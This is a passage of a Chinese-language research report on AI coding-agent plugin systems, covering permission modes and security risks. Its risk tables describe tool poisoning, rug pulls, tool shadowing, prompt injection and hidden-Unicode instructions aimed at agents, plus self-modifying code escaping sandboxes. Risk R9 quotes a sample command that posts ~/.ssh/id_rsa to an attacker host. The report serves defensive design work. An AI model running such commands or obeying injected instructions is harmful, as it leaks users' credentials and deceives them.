| 9 | **回滚** | 至少准备三层：(a) **关掉**——`claude plugin disable <name>@skills-dir` 或直接删目录；(b) **版本钉住**——manifest 里写 `version` 会把用户钉在该版本直到字符串改变，这也意味着**改版本号是唯一的升级动作**；(c) **状态与代码分离**——把持久状态放 `${CLAUDE_PLUGIN_DATA}`，因为 `${CLAUDE_PLUGIN_ROOT}` 每次版本更新都会换路径，写在那儿的状态会丢。 | `[源]` S14（disable 命令）、S13（`version` 的钉住语义、`CLAUDE_PLUGIN_ROOT` vs `CLAUDE_PLUGIN_DATA` 的区别与「不要在 ROOT 写状态」）、S15（`.orphaned_at` 标记 + 14 天后清理，因此**已加载旧版本的会话可以继续跑**，这本身就是一种回滚缓冲）。 |
| 10 | **（并发场景）工作隔离** | 多个 agent 并行造/改工具时，每个写在自己的 git worktree 里，事后归并。Claude Code 已有 `isolation: worktree` 子代理字段，并对 worktree 内的 git 命令做重定向检查。 | `[源]` S22（`isolation: worktree` 与「如何强制隔离」）。 |

### 3.1 已知失败模式（逐条附源）

| 失败模式 | 具体表现 | 来源 |
|---|---|---|
| **描述不匹配 → 永不触发** | 元数据写得像实现说明而非触发条件，模型永远想不起来用它。 | `[源]` S9 |
| **上下文预算被工具定义吃光** | 声明式工具越多，进入 prompt 的 schema 越大；GitHub 官方 MCP 单独消耗数万 token，导致「剩下给模型干活的预算所剩无几」。Skills 的应对是把预载压缩到几十 token。Claude Code 对子代理描述总量设了 15,000 token 的告警上限。 | `[源]` S33、S9、S22 |
| **自改代码逃逸沙箱 / 奖励黑客** | 自我改进产生的代码会尝试绕过沙箱约束；STOP 摘要把「评估生成代码绕过沙箱的频率」写成了本工作的一项内容。 | `[源]` S30 |
| **自我评估器与被评估者同源漂移** | 用同一个模型既当选手又当裁判，两者一起变；Self-Rewarding 论文把「奖励质量同时提升」当作正面结果报告，但这也意味着**没有人独立校准这个奖励**。 | `[源]` S29（现象）；`[推断]` 把「同源漂移」命名为风险 |
| **注释即攻击面（tool poisoning / rug pull / shadowing）** | 隐藏指令让 agent 读 `~/.ssh/id_rsa` 并当作正常参数外传；批准后偷改描述；用自己工具的描述改写对另一个受信服务器的行为，且用户可见日志中只出现可信工具。 | `[源]` S35 |
| **配置变更即自动执行 → 先执行后同意** | Cursor 的 `~/.cursor/mcp.json` 新条目自动启动，「即使这次编辑被拒绝，代码执行也已经发生了」。 | `[源]` S38 |
| **插件自跑代码在沙箱之外** | 权限规则与沙箱只覆盖 Claude 发起的工具调用；hooks / MCP server / LSP / mods 以用户全权限在沙箱外运行；`bin/` 还会被加进 Bash 的 PATH。 | `[源]` S16、S39 |
| **不可见字符污染指令文件** | 零宽/bidi/Tags 块字符把恶意指令藏进规则文件；**在 PR 审核界面同样不可见**；污染随 fork 传播；模型被指示不要告知开发者。 | `[源]` S37 |
| **供应链投毒（依赖与包）** | 一行 BCC 代码即造成 1,643+ 次下载的真实泄露；这也是 Claude Code 对插件依赖安装施加「仅注册表包 + 精确版本 + `--ignore-scripts` + 独立安装目录（不读插件自己的 `.npmrc`/`.env`）+ 60s 超时」这套限制的原因。 | `[源]` S34、S15 |
| **「我以为它生效了」但会话仍跑旧版本** | 运行中会话保留已加载版本直到 `/reload-plugins`；monitors 需要重启会话；插件中途更新后 hook/MCP/LSP 仍指向旧路径。 | `[源]` S15 |
| **技能库膨胀 → 检索失败** | Voyager 依赖「存储与检索」这对动作，技能库只增不减时检索质量会退化。 | `[推断]` — 本次未找到直接测量「技能库规模 vs 检索准确率」的可靠来源，标注为**未找到可靠来源**。 |

---

## 4. 模式（mode）/ 预设设计参考

### 4.1 Claude Code：六档权限模式（语义精确版）

| 模式 | 无需询问即可运行 | 适用场景 |
|---|---|---|
| `default`（UI 名 **Manual**） | 仅读取 | 逐个审阅每个动作、敏感工作 |
| `acceptEdits` | 读取、文件编辑、常见文件系统命令（`mkdir`/`touch`/`rm`/`rmdir`/`mv`/`cp`/`sed`） | 迭代自己在审阅的代码 |
| `plan` | 读取；（auto 可用时）加上经分类器批准的命令 | 改代码前先探索代码库 |
| `auto` | 一切，配后台安全分类器 | 长任务、降低弹窗疲劳 |
| `dontAsk` | 读取 + 预批准工具；**其余一律拒绝** | 锁死的 CI 与脚本 |
| `bypassPermissions` | 一切 | **仅限隔离容器/VM**；文档自陈「对提示注入或意外动作不提供任何保护」 |

- **切换**：CLI 中 `Shift+Tab` 循环（`auto → default → acceptEdits → plan →` 可选模式，`bypassPermissions` 在前、`auto` 在后；`dontAsk` **不进循环**，只能靠 flag）。VS Code 用模式指示器，Desktop 用模式选择器。
- **启动优先级**：`--permission-mode` / `--dangerously-skip-permissions` → `permissions.defaultMode` → 内置默认（v2.1.283+ 为 `auto`；`-p`/Agent SDK 为 `default`）。**注意：`auto` 与 `bypassPermissions` 从项目级 `.claude/settings.json` / `.local.json` 设置不生效**——这是防止仓库文件把开发者推进高权限模式的刻意设计。
- **两层硬护栏（任何模式都不自动放行）**：
  - *Protected paths*：`.git`、`.config/git`、`.vscode`、`.idea`、`.husky`、`.cargo`、`.devcontainer`、`.yarn`、`.mvn`、`.claude`，以及 `.npmrc`/`.bashrc`/`.zshrc`/`.mcp.json`/`.claude.json` 等文件。`permissions.allow` 规则**无法**预批准这些写入。
  - *Critical paths*：文件系统根、根的直接子目录、家目录、Windows 盘根、工作目录及其父目录。`allow` 规则与 `PreToolUse` hook 返回 `"allow"` 都**不能**批准对关键路径的 `rm`/`rmdir`；在 `auto`/`bypassPermissions` 下走两分钟倒计时提示，超时即拒绝。
- **模式不是唯一旋钮**：沙箱（`sandbox.enabled` / `autoAllowBashIfSandboxed` / `filesystem.allowWrite|denyRead` / `network.allowedDomains|deniedDomains`）、`permissions.{allow,ask,deny}` 规则、以及子代理的 `permissionMode` 是**独立维度**，与模式正交叠加。

### 4.2 模式维度归纳表

| 产品 | 工具集可切换 | 权限可切换 | 提示词可切换 | 模型可切换 | 表达载体 |
|---|---|---|---|---|---|
| **Claude Code** | ✅ 子代理 `tools`/`disallowedTools` | ✅ 六种 permission mode + `allow`/`ask`/`deny` + 沙箱 | ✅ 子代理 body、skills、output styles | ✅ 子代理 `model`、`/model` | `settings.json` 各层 + `.claude/agents/*.md` + `--permission-mode` |
| **Zed** | ✅ `agent.profiles.*.tools` 逐工具布尔 | ➖ profile 决定「可用性」，权限另设（Tool Permissions） | ✅（自定义 profile） | ✅ `default_model.{provider,model}` | `settings.json` → `agent.profiles` |
| **Kilo Code** | ✅ `permission` glob 规则 | ✅ `allow`/`deny`/`ask`，末条胜出 | ✅ `prompt`（md 正文） | ✅ `model`（`provider/model`）+ `temperature`/`top_p` | `.kilo/agent/*.md` 或 `kilo.jsonc` 的 `agent` 键 |
| **GitHub Copilot** | ✅ `tools` 数组 | ➖（工具白名单即近似权限） | ✅ md 正文 | ✅ `model`（可传数组做回退） | `.github/agents/*.agent.md` |
| **Cursor** | ✅（Plugins 内的 agents） | ➖ 团队 marketplace 三档分发 | ✅ Rules（`.mdc`）与 Agents | ✅ | `.cursor/rules/*.mdc`、`.cursor/agents/`、`.cursor-plugin/plugin.json` |
| **Agent Skills / Agent Plugins** | ➖ 仅 `allowed-tools`（实验性） | ❌ 格式内无权限模型 | ✅ SKILL.md 正文 | ❌ | `SKILL.md` / `plugin.json` |

### 4.3 「三档式标准/创造/自定义」专项结论

**未找到任何以「标准 / 创造 / 自定义」命名三档模式的产品。** 这是本次调研的一个明确**否定结论**。

最接近的三个真实设计，可作为自研平台的映射参考：

1. **Zed：恰好三个内置 profile** — `Write`（读+改+跑命令）/ `Ask`（只读问答）/ `Minimal`（不用任何项目工具），并可 fork 或新建自定义 profile。**这是形式上最接近「三档内置 + 自定义」的产品**，但三档切的是「读写权限」，不是「创造/通用」。(S23)
2. **Cursor 团队 marketplace 的三档分发** — `Default Off`（开发者可选装）/ `Default On`（默认装、可退出）/ `Required`（永远安装且不可卸载）。**这是本次找到的唯一「字面意义的三档递进管控」**，但它控制的是**分发强制度**而非 agent 能力。(S18)
3. **Claude Code 的六档权限阶梯 + `dontAsk` 不进循环** — 用「哪些模式允许被用户切到」来表达「平台认可的档位」。(S20)

**工程推断**：如果自研平台要做「标准 / 创造 / 自定义」三档，最自然的维度映射是——
- **标准档** = 固定工具集 + 严格权限模式（对应 Claude Code `default`/`dontAsk`）+ 平台托管提示词 + 平台选定模型；
- **创造档** = 放宽工具集（含自建/自装插件加载目录）+ `auto` 类模式 + 允许 agent 改写自己的技能目录 + 但**保留 critical/protected paths 硬护栏**；
- **自定义档** = 三维全开，但必须显式声明「本档下插件代码不在沙箱内」这类事实，并把三档的差异**落在配置文件里可 diff、可版本控制**（借 S24 Kilo 的配置合并与 S21 的层级优先级）。
> 依据是 S20/S21/S23/S24 的设计取舍，属**工程推断**，无任何产品直接实现该三档命名。

---

## 5. 安全风险清单（每条附来源）

| # | 风险 | 具体机制 | 来源 |
|---|---|---|---|
| R1 | **插件即任意代码执行** | 「你安装的 Claude Code 插件可以以你的用户权限在你的机器上执行任意代码」；权限规则与沙箱**不覆盖插件自跑的代码**，hooks/MCP/LSP/mods 在沙箱外运行；`bin/` 被加进 Bash 的 PATH。 | S16、S39 |
| R2 | **工具描述投毒（Tool Poisoning）** | 对人类不可见、对模型可见的指令写进工具描述；确认弹窗只显示简化工具名。可让 agent 读 SSH 私钥、`mcp.json` 并作为普通参数外传。 | S35 |
| R3 | **Rug Pull（批准后偷改）** | 服务器在客户端批准之后修改工具描述，绕过「安装时同意」。 | S35 |
| R4 | **Tool Shadowing（跨服务器改写行为）** | 恶意服务器的工具描述改写对**另一个受信服务器**工具的行为（把 `send_email` 的收件人换掉）；**单独就足够，且不出现在用户可见日志**。 | S35 |
| R5 | **间接提示注入 → 数据外泄（Toxic Agent Flow）** | 恶意 GitHub Issue → agent 拉取私有仓库内容 → 自动在公开仓库开 PR 外泄。**不是 MCP server 代码缺陷，是架构问题**，服务端补不了。 | S36 |
| R6 | **配置变更即自动执行** | Cursor `~/.cursor/mcp.json` 新增条目自动启动无需确认 → 单条 Slack 消息即可 RCE；「即使这次编辑被拒绝，代码执行也已经发生了」（CVE-2025-54135, CVSS 8.6）。 | S38 |
| R7 | **不可见 Unicode 指令污染** | 零宽连接符/bidi/Unicode Tags 藏恶意指令进 `.cursor/rules` 与 Copilot 指令文件；在 PR 审核界面同样不可见；随 fork 传播；模型被要求不告知开发者。**两家厂商初期均判定「用户责任」**，GitHub 后于 2025-05-01 上线隐藏 Unicode 警告。 | S37 |
| R8 | **真实 npm 供应链投毒（首个野外恶意 MCP server）** | `postmark-mcp` v1.0.16 一行代码 BCC 全部邮件到攻击者；下架前 1,643+ 次下载。 | S34 |
| R9 | **本地 MCP server 恶意启动命令** | 规范给出的真实形态：`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`。要求客户端在「一键配置」前**不截断**展示完整命令。 | S40 |
| R10 | **SSRF 打云元数据** | 恶意 MCP server 在 OAuth 元数据发现阶段回填 `http://169.254.169.254/...`，让客户端取回云凭据。 | S4 |
| R11 | **OAuth 授权 URL 注入 XSS/RCE** | 恶意 server 提供 `javascript:` URL 或含 shell 注入载荷的 URL；配合 stdio 代理可把 Web 攻击升级为宿主命令执行。 | S4 |
| R12 | **Confused Deputy / Token Passthrough / 会话劫持** | 静态 client ID + 动态注册 + 同意 cookie 组合可跳过用户同意；token 透传破坏审计与信任边界；会话 ID 可被猜测/窃取后注入事件。 | S4 |
| R13 | **Scope 膨胀** | 一次性申请全部 `scopes_supported`，导致单个 token 泄露即可横向访问；规范要求渐进式最小权限 + `WWW-Authenticate` 增量提权。 | S4 |
| R14 | **沙箱自身的已知局限** | 代理默认不做 TLS 解包 → 宽松域名可被 domain fronting 绕过；放通 `docker.sock` 等于放通宿主；过宽的 `allowWrite` 可提权（写入含可执行文件的 `$PATH` 目录或 `.bashrc`）；`enableWeakerNestedSandbox` 大幅削弱安全性；**原生 Windows 不沙箱**。 | S39 |
| R15 | **工具注解不可信** | `readOnlyHint`/`destructiveHint`/`idempotentHint`/`openWorldHint` 全是 hint；规范明令客户端**必须**视为不可信（除非来自受信服务器），SDK 文档进一步写「**永远不应**基于不可信服务器的 annotations 做调用决策」。 | S3、S6 |
| R16 | **注册表不承担安全责任** | MCP Registry 明确把安全扫描委托给 npm/PyPI/Docker Hub 与下游聚合器，自身只做命名空间认证（反向 DNS/GitHub/DNS 挑战）与元数据托管。 | S5 |
| R17 | **信任面靠命名与人工审核兜底** | Claude Code 用「official/community 名称只接受来自 `github.com/anthropics/` 的源」+ 保留名检查（禁止 `claude-` 前缀等冒充 Anthropic）+ `sha256` 归档完整性校验 + 社区目录 commit SHA 钉住；Cursor 用逐个人工审核。**两者都是流程性防护，不是技术性隔离。** | S16、S18 |
| R18 | **可移植标准不覆盖权限** | Agent Plugins 明文把分发/安装/权限/UX 留给客户端；headers 被规定为「可见的包数据，不是可移植的密钥机制」，且 v1 无 OAuth 配置或凭据引用字段。 | S12 |
| R19 | **毒化指令可借「自建」路径回流** | 自建技能一旦被污染，下一次加载即成为可信上下文的一部分；官方口径只能给到「只从可信来源安装、审计依赖与捆绑资源、警惕要求连接不可信网络的指令」。 | S9 |
| R20 | **子代理输出携带指令** | 子代理可能读过你从未审阅的文件/网页/命令输出，其中的文本可携带面向主会话的指令；宿主只能做转义与标记，且**该扫描不判断内容是否恶意**。 | S22 |

### 5.1 主流缓解手段一览（可借鉴）

| 手段 | 出处示例 |
|---|---|
| 人工审核 + 命名分层 + 完整性校验 | Claude Code marketplace tiers 与 sha256 归档校验 (S16)；Cursor 官方 marketplace 人工审核 (S18) |
| 提交级钉住（commit SHA） | 社区目录对几乎每个条目钉 commit SHA，且拒绝安装不同 commit (S16) |
| 路径围栏（禁止逃出插件根，含 symlink） | Claude Code「path escapes plugin directory」(S13/S15)；Agent Plugins §4.1 (S12) |
| 依赖安装硬化 | 仅注册表包 + 精确版本 + 支持锁文件 + 独立安装目录（不读插件的 `.npmrc`/`.env`）+ `--ignore-scripts` + 60s 超时 (S15) |
| 声明式配置 + 敏感项隔离 | `userConfig` 的 `sensitive: true` 走平台安全凭据存储；`${user_config.KEY}` 禁止进入 shell 形式命令 (S13) |
| 自建件不得自我扩权 | 插件子代理的 `hooks`/`mcpServers`/`permissionMode` 被忽略 (S22) |
| 输出再入扫描与标记 | 子代理报告 imitate 宿主标签时插反斜杠；提及权限设置时插 `[harness: subagent output matched instruction-shaped pattern(s): …]` (S22) |
| 企业级管控面 | 允许/阻断 marketplace 源、强制启用插件、关闭 `--plugin-dir`/`--plugin-url`/`CLAUDE_CODE_PLUGIN_DIRS`、限制 hooks 来源、阻止 claude.ai 同步插件 (S16) |
| 遥测侧的隐私保护 | 非官方插件名在 OTEL 与 Analytics API 中被归一为字面量 `third-party`，除非显式设置 `OTEL_LOG_TOOL_DETAILS=1` (S16) |
| 硬编码的破坏性操作断路器 | protected paths / critical paths 两级；`allow` 规则与 hook 的 `"allow"` 都无法批准关键路径删除 (S20) |
| 运行时数据流策略 | Invariant 建议「每会话只允许访问一个 repo」这类跨工具调用约束 (S36) |

---

## 6. 对自研平台插件系统的建议（≤300 字）

**格式**：对外兼容 Agent Plugins v1，零成本接入 Cursor/OpenAI 生态；对内保留自有 manifest 放依赖与声明式配置，学 Claude Code。勿自创字段名，会被生态隔离。

**权限**：`allowed-tools` 只是提示。真正边界要三层：① 插件自跑代码默认关进沙箱（主流产品都没做，是差异点）；② glob 规则 `allow`/`deny`/`ask`，末条胜出；③ protected/critical paths 硬断路器，任何规则都批不了。工具注解一律不可信。

**模式**：做可 diff 的三档预设，拆成工具集×权限×提示词×模型四轴；配置按组织>项目>个人合并，列表键合并而非覆盖。

**自建闭环**：脚手架 → 结构校验 → 行为回归（开关插件跑同组用例给分差）→ 热重载 → 一键 disable。落位用目录扫描自动加载，回滚用代码与状态分离加版本钉住。

**铁律**：Agent 自建的插件，不得能改自己的权限配置。

---

## 7. 未能核验的条目（诚实清单）

1. **OpenAI Apps SDK / App 提交审核细则**：`https://developers.openai.com/apps-sdk` 与 `.../app-submission-guidelines` 均返回 **HTTP 403**，正文未能读取。仅确认 `https://openai.com/index/introducing-apps-in-chatgpt/`（2025-10-06 公告）可用，且确认 Apps SDK 与 ChatGPT 中的应用以 MCP 为基础。→ 关于「OpenAI 是否要求 manifest、是否有审核流程」的具体字段与流程，**本次未找到可靠来源**。
2. **GitHub Copilot 仓库级自定义指令正文**：`https://docs.github.com/en/copilot/how-tos/copilot-on-github/customize-copilot/add-custom-instructions/add-repository-instructions` 与 `https://docs.github.com/en/copilot/reference/custom-agents-configuration` 均只抓到导航骨架，正文被截断。→ **`.github/copilot-instructions.md`、`.github/instructions/*.instructions.md` 的 `applyTo` frontmatter、`*.prompt.md` 的 `mode`/`tools` 字段，本次未从官方页面核验**，本报告未采用这些细节。字段结论均引自 S25（Microsoft Learn 培训模块）。
3. **Roo Code 官方文档**：未直接抓取 Roo Code 官方站点；本报告中 `.roomodes` / `custom_modes.yaml` 的字段（`slug`/`roleDefinition`/`customInstructions`/`groups`/`whenToUse`）来自 **Kilo Code 官方文档的「迁移自 VSCode 扩展模式」章节**（S24），属**同源二手的官方描述**，非 Roo 官方一手文档。
4. **MCP Registry `server.json` 完整 schema**：仅从 S5 得到字段**类别**（唯一名称如 `io.github.user/server-name`、包位置、执行指令、描述与能力），**未逐字段核验 schema 文件**。
5. **Voyager 技能库的内部实现细节**：本次仅核验到 arXiv 摘要层描述（「ever-growing skill library of executable code for storing and retrieving complex behaviors」）。**技能以何键索引、用何嵌入检索、如何在库满时淘汰，本次未从论文正文核验**。
6. **「技能库规模膨胀导致检索退化」的定量证据**：→ **未找到可靠来源**，报告中已标注为工程推断。
7. **三档式「标准 / 创造 / 自定义」模式**：→ **未找到任何产品实现该命名或等价三档语义**。最接近的是 Zed 的三个内置 profile（Write/Ask/Minimal，S23）与 Cursor 团队 marketplace 的三档分发（Default Off/Default On/Required，S18）。
8. **Anthropic `plugin.json` 的 `settings` 字段生效范围**：文档原文为「只有 `agent` 和 `subagentStatusLine` 生效，其他键在加载时被丢弃」（S13）。除此之外的键语义未核验。

---

*报告结束。所有 URL 均于本次调研中实际抓取成功（除第 7 节明确列出的失败项）。*
